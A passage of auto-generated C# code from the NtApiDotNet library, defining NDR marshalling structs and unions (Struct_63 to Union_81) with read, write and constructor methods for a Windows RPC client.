NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteInt32(Member4);\n            m.WriteInt32(Member8);\n            m.WriteEmbeddedPointer<char>(Member10, new System.Action<char>(m.WriteChar));\n            m.WriteEmbeddedPointer<char>(Member18, new System.Action<char>(m.WriteChar));\n            m.WriteInt32(Member20);\n            m.WriteInt32(Member24);\n            m.WriteInt32(Member28);\n            m.WriteInt16(Member2C);\n            m.WriteInt64(Member30);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member4 = u.ReadInt32();\n            Member8 = u.ReadInt32();\n            Member10 = u.ReadEmbeddedPointer<char>(new System.Func<char>(u.ReadChar), false);\n            Member18 = u.ReadEmbeddedPointer<char>(new System.Func<char>(u.ReadChar), false);\n            Member20 = u.ReadInt32();\n            Member24 = u.ReadInt32();\n            Member28 = u.ReadInt32();\n            Member2C = u.ReadInt16();\n            Member30 = u.ReadInt64();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        public int Member0;\n        public int Member4;\n        public int Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char> Member18;\n        public int Member20;\n        public int Member24;\n        public int Member28;\n        public short Member2C;\n        public long Member30;\n        public static Struct_63 CreateDefault()\n        {\n            return new Struct_63();\n        }\n        public Struct_63(int Member0, int Member4, int Member8, System.Nullable<char> Member10, System.Nullable<char> Member18, int Member20, int Member24, int Member28, short Member2C, long Member30)\n        {\n            this.Member0 = Member0;\n            this.Member4 = Member4;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n            this.Member24 = Member24;\n            this.Member28 = Member28;\n            this.Member2C = Member2C;\n            this.Member30 = Member30;\n        }\n    }\n    public struct Struct_64 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<char>(Member8, new System.Action<char>(m.WriteChar));\n            m.WriteEmbeddedPointer<char>(Member10, new System.Action<char>(m.WriteChar));\n            m.WriteInt32(Member18);\n            m.WriteInt32(Member1C);\n            m.WriteInt32(Member20);\n            m.WriteInt16(Member24);\n            m.WriteInt64(Member28);\n            m.WriteInt32(Member30);\n            m.WriteInt32(Member34);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<char>(new System.Func<char>(u.ReadChar), false);\n            Member10 = u.ReadEmbeddedPointer<char>(new System.Func<char>(u.ReadChar), false);\n            Member18 = u.ReadInt32();\n            Member1C = u.ReadInt32();\n            Member20 = u.ReadInt32();\n            Member24 = u.ReadInt16();\n            Member28 = u.ReadInt64();\n            Member30 = u.ReadInt32();\n            Member34 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char> Member10;\n        public int Member18;\n        public int Member1C;\n        public int Member20;\n        public short Member24;\n        public long Member28;\n        public int Member30;\n        public int Member34;\n        public static Struct_64 CreateDefault()\n        {\n            return new Struct_64();\n        }\n        public Struct_64(int Member0, System.Nullable<char> Member8, System.Nullable<char> Member10, int Member18, int Member1C, int Member20, short Member24, long Member28, int Member30, int Member34)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member1C = Member1C;\n            this.Member20 = Member20;\n            this.Member24 = Member24;\n            this.Member28 = Member28;\n            this.Member30 = Member30;\n            this.Member34 = Member34;\n        }\n    }\n    public struct Struct_65 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_66(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_66();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public Union_66 Member8;\n        public static Struct_65 CreateDefault()\n        {\n            return new Struct_65();\n        }\n        public Struct_65(int Member0, Union_66 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_66 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 1))\n            {\n                m.WriteEmbeddedPointer<Struct_67>(Arm_1, new System.Action<Struct_67>(m.Write_67));\n                goto done;\n            }\n            m.WriteEmpty(Arm_Default);\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 1))\n            {\n                Arm_1 = u.ReadEmbeddedPointer<Struct_67>(new System.Func<Struct_67>(u.Read_67), false);\n                goto done;\n            }\n            Arm_Default = u.ReadEmpty();\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_67> Arm_1;\n        public NtApiDotNet.Ndr.Marshal.NdrEmpty Arm_Default;\n        public static Union_66 CreateDefault()\n        {\n            return new Union_66();\n        }\n        public Union_66(uint Selector, System.Nullable<Struct_67> Arm_1, NtApiDotNet.Ndr.Marshal.NdrEmpty Arm_Default)\n        {\n            this.Selector = Selector;\n            this.Arm_1 = Arm_1;\n            this.Arm_Default = Arm_Default;\n        }\n    }\n    public struct Struct_67 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteUInt3264(Member8);\n            m.WriteInt32(Member10);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadUInt3264();\n            Member10 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member8;\n        public int Member10;\n        public static Struct_67 CreateDefault()\n        {\n            return new Struct_67();\n        }\n        public Struct_67(int Member0, NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member8, int Member10)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_68 : NtApiDotNet.Ndr.Marshal.INdrConformantStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteInt32(Member4);\n            m.WriteInt32(Member8);\n            m.Write_106(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(Member10, \"Member10\"), Member8);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member4 = u.ReadInt32();\n            Member8 = u.ReadInt32();\n            Member10 = u.Read_106();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrConformantStructure.GetConformantDimensions()\n        {\n            return 1;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public int Member4;\n        public int Member8;\n        public Struct_69[] Member10;\n        public static Struct_68 CreateDefault()\n        {\n            Struct_68 ret = new Struct_68();\n            ret.Member10 = new Struct_69[0];\n            return ret;\n        }\n        public Struct_68(int Member0, int Member4, int Member8, Struct_69[] Member10)\n        {\n            this.Member0 = Member0;\n            this.Member4 = Member4;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_69 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.Write_70(Member10);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.Read_70();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public Struct_70 Member10;\n        public static Struct_69 CreateDefault()\n        {\n            return new Struct_69();\n        }\n        public Struct_69(int Member0, string Member8, Struct_70 Member10)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_70 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_71(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_71();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public Union_71 Member8;\n        public static Struct_70 CreateDefault()\n        {\n            return new Struct_70();\n        }\n        public Struct_70(int Member0, Union_71 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_71 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 0))\n            {\n                m.WriteInt32(Arm_0);\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                m.WriteInt32(Arm_3);\n                goto done;\n            }\n            if ((Selector == 1))\n            {\n                m.WriteInt32(Arm_1);\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                m.WriteEmbeddedPointer<string>(Arm_4, new System.Action<string>(m.WriteTerminatedString));\n                goto done;\n            }\n            if ((Selector == 5))\n            {\n                m.WriteEmbeddedPointer<string>(Arm_5, new System.Action<string>(m.WriteTerminatedString));\n                goto done;\n            }\n            if ((Selector == 6))\n            {\n                m.WriteEmbeddedPointer<string>(Arm_6, new System.Action<string>(m.WriteTerminatedString));\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                m.WriteFloat(Arm_2);\n                goto done;\n            }\n            if ((Selector == 7))\n            {\n                m.Write_72(Arm_7);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_71\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 0))\n            {\n                Arm_0 = u.ReadInt32();\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                Arm_3 = u.ReadInt32();\n                goto done;\n            }\n            if ((Selector == 1))\n            {\n                Arm_1 = u.ReadInt32();\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                Arm_4 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n                goto done;\n            }\n            if ((Selector == 5))\n            {\n                Arm_5 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n                goto done;\n            }\n            if ((Selector == 6))\n            {\n                Arm_6 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                Arm_2 = u.ReadFloat();\n                goto done;\n            }\n            if ((Selector == 7))\n            {\n                Arm_7 = u.Read_72();\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_71\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public int Arm_0;\n        public int Arm_3;\n        public int Arm_1;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Arm_4;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Arm_5;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Arm_6;\n        public float Arm_2;\n        public Struct_72 Arm_7;\n        public static Union_71 CreateDefault()\n        {\n            return new Union_71();\n        }\n        public Union_71(uint Selector, int Arm_0, int Arm_3, int Arm_1, string Arm_4, string Arm_5, string Arm_6, float Arm_2, Struct_72 Arm_7)\n        {\n            this.Selector = Selector;\n            this.Arm_0 = Arm_0;\n            this.Arm_3 = Arm_3;\n            this.Arm_1 = Arm_1;\n            this.Arm_4 = Arm_4;\n            this.Arm_5 = Arm_5;\n            this.Arm_6 = Arm_6;\n            this.Arm_2 = Arm_2;\n            this.Arm_7 = Arm_7;\n        }\n    }\n    public struct Struct_72 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<sbyte[], long>(Member8, new System.Action<sbyte[], long>(m.Write_95), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<sbyte[]>(new System.Func<sbyte[]>(u.Read_95), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<sbyte[]> Member8;\n        public static Struct_72 CreateDefault()\n        {\n            return new Struct_72();\n        }\n        public Struct_72(int Member0, sbyte[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_73 : NtApiDotNet.Ndr.Marshal.INdrConformantStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteInt32(Member4);\n            m.WriteInt32(Member8);\n            m.Write_107(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(Member10, \"Member10\"), Member8);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member4 = u.ReadInt32();\n            Member8 = u.ReadInt32();\n            Member10 = u.Read_107();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrConformantStructure.GetConformantDimensions()\n        {\n            return 1;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public int Member4;\n        public int Member8;\n        public Struct_74[] Member10;\n        public static Struct_73 CreateDefault()\n        {\n            Struct_73 ret = new Struct_73();\n            ret.Member10 = new Struct_74[0];\n            return ret;\n        }\n        public Struct_73(int Member0, int Member4, int Member8, Struct_74[] Member10)\n        {\n            this.Member0 = Member0;\n            this.Member4 = Member4;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_74 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteInt32(Member4);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.Write_70(Member10);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member4 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.Read_70();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public int Member4;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public Struct_70 Member10;\n        public static Struct_74 CreateDefault()\n        {\n            return new Struct_74();\n        }\n        public Struct_74(int Member0, int Member4, string Member8, Struct_70 Member10)\n        {\n            this.Member0 = Member0;\n            this.Member4 = Member4;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_75 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_76(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_76();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public Union_76 Member8;\n        public static Struct_75 CreateDefault()\n        {\n            return new Struct_75();\n        }\n        public Struct_75(int Member0, Union_76 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_76 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 1))\n            {\n                m.WriteEmbeddedPointer<Struct_77>(Arm_1, new System.Action<Struct_77>(m.Write_77));\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_76\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 1))\n            {\n                Arm_1 = u.ReadEmbeddedPointer<Struct_77>(new System.Func<Struct_77>(u.Read_77), false);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_76\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_77> Arm_1;\n        public static Union_76 CreateDefault()\n        {\n            return new Union_76();\n        }\n        public Union_76(uint Selector, System.Nullable<Struct_77> Arm_1)\n        {\n            this.Selector = Selector;\n            this.Arm_1 = Arm_1;\n        }\n    }\n    public struct Struct_77 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public static Struct_77 CreateDefault()\n        {\n            return new Struct_77();\n        }\n        public Struct_77(int Member0, string Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_78 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteGuid(Member0);\n            m.Write_26(Member10);\n            m.WriteInt64(Member18);\n            m.Write_108(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(Member20, \"Member20\"));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadGuid();\n            Member10 = u.Read_26();\n            Member18 = u.ReadInt64();\n            Member20 = u.Read_108();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        public System.Guid Member0;\n        public Struct_26 Member10;\n        public long Member18;\n        public string Member20;\n        public static Struct_78 CreateDefault()\n        {\n            Struct_78 ret = new Struct_78();\n            ret.Member20 = new string('\\0', 260);\n            return ret;\n        }\n        public Struct_78(System.Guid Member0, Struct_26 Member10, long Member18, string Member20)\n        {\n            this.Member0 = Member0;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n        }\n    }\n    public struct Struct_80 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_80(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_80();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public Union_81 Member8;\n        public static Struct_80 CreateDefault()\n        {\n            return new Struct_80();\n        }\n        public Struct_80(int Member0, Union_81 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_81 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 1))\n            {\n                m.WriteEmbeddedPointer<Struct_82>(Arm_1, new System.Action<Struct_82>(m.Write_81));\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_81\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 1))\n            {\n                Arm_1 = u.ReadEmbeddedPointer<Struct_82>(new 